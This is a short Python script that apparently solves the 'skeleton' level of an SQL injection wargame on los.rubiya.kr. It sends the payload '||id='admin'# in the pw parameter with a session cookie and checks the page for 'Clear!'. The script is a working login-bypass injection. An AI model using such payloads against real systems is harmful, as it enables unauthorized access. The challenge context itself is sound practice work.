import requests

url ="https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php/"
cookie = {"PHPSESSID":"c0bed5cfkoofgp0l3nfhdr2c89"}

if requests.get(url,{"pw":f"'||id='admin'#"},cookies=cookie).text.find("Clear!") > 0:print("[*] Success")
